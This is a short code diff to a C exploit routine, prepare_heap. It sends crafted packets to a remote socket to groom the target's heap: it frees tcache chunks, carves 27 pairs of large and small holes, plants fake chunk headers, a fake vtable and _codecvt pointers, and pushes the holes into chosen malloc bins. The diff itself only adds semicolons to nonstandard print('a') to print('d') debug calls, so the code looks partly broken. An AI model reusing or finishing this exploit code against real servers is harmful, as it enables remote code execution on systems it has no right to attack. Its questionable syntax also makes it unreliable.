@@ -303,7 +303,7 @@ void
 prepare_heap (int sock)
 {
   // Packet a: Allocate and free tcache chunks
-  print('a')
+  print('a');
   for (int i = 0; i < 10; i++)
     {
       unsigned char tcache_chunk[64];
@@ -313,7 +313,7 @@ prepare_heap (int sock)
     }
 
   // Packet b: Create 27 pairs of large (~8KB) and small (320B) holes
-   print('b')
+   print('b');
   for (int i = 0; i < 27; i++)
     {
       // Allocate large chunk (~8KB)
@@ -328,7 +328,7 @@ prepare_heap (int sock)
     }
 
   // Packet c: Write fake headers, footers, vtable and _codecvt pointers
-   print('c')
+   print('c');
   for (int i = 0; i < 27; i++)
     {
       unsigned char fake_data[4096];
@@ -338,7 +338,7 @@ prepare_heap (int sock)
     }
 
   // Packet d: Ensure holes are in correct malloc bins (send ~256KB string)
-   print('d')
+   print('d');
   unsigned char large_string[MAX_PACKET_SIZE - 1];
   memset (large_string, 'E', sizeof (large_string));
   send_packet (sock, 5, large_string, sizeof (large_string));
